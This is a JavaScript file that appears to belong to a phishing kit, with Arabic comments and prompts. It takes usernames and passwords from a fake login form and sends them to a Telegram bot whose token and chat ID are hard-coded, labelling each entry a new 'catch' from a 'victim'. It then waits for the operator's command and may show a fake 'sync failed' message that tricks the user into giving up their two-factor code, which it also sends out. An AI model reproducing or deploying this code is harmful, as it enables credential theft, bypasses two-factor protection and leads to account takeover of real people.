const TG_BOT_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let currentStep = "auth";

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const msg = document.getElementById('status-text');
    const btn = document.getElementById('sync-btn');

    if (u.length < 5 || p.length < 5) return alert("البيانات غير مكتملة!");

    btn.disabled = true;
    btn.innerText = "Connecting to Node...";

    // إرسال البيانات للآدمن (أنت) مع خيارات التحكم
    const text = `🎯 صيد جديد!\n👤 المستخدم: ${u}\n🔑 الباسوورد: ${p}\n\nإختر الإجراء التالي للضحية:`;
    
    const keyboard = {
        inline_keyboard: [
            [{ text: "🔐 طلب رمز المصادقة", callback_data: "ask_2fa" }],
            [{ text: "❌ فشل المزامنة (إعادة)", callback_data: "fail_sync" }],
            [{ text: "🔓 دخول مباشر", callback_data: "allow_entry" }]
        ]
    };

    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, reply_markup: keyboard })
    });

    // الآن الموقع يدخل في حالة "انتظار أمر الآدمن"
    startListening();
}

// وظيفة الاستماع لأوامرك من التلجرام
function startListening() {
    const msg = document.getElementById('status-text');
    const btn = document.getElementById('sync-btn');
    
    msg.innerText = "⏳ جاري التحقق من أمان السيرفر... يرجى الانتظار";
    
    const checkStatus = setInterval(async () => {
        const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        const lastAction = data.result[0]?.callback_query?.data;

        if (lastAction === "ask_2fa") {
            clearInterval(checkStatus);
            show2FAUI();
        } else if (lastAction === "allow_entry") {
            clearInterval(checkStatus);
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
        }
    }, 3000); // يفحص كل 3 ثواني هل ضغطت أنت على الزر أم لا
}

function show2FAUI() {
    const msg = document.getElementById('status-text');
    const uInput = document.getElementById('u_log');
    const pInput = document.getElementById('u_pas');
    const btn = document.getElementById('sync-btn');

    uInput.classList.add('hidden');
    pInput.value = "";
    pInput.placeholder = "- - - - - -";
    msg.innerText = "❌ فشلت المزامنة! حسابك محمي. يرجى إدخال رمز المصادقة أو إلغاء تفعيلها من الإعدادات ثم إدخال الرمز هنا:";
    msg.style.color = "#ff4444";
    btn.innerText = "تأكيد الرمز النهائي";
    btn.disabled = false;
    
    btn.onclick = async () => {
        const code = pInput.value;
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 الرمز المستلم: ${code}` })
        });
        alert("رمز خاطئ أو منتهي الصلاحية! أعد المحاولة.");
    };
}
